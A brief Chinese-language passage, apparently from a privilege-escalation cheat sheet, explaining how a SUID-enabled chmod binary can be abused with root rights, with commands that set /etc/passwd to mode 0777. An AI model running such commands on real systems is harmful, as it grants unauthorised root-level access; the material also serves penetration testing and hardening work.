如果 chmod 拥有 S 权限，我们可以使用它以 root 权限来修改其他文件权限。
例如使用 chmod 修改/etc/passwd 文件：
```
LFILE=/etc/passwd
./chmod 0777 $LFILE
```
然后就可以读取passwd文件了
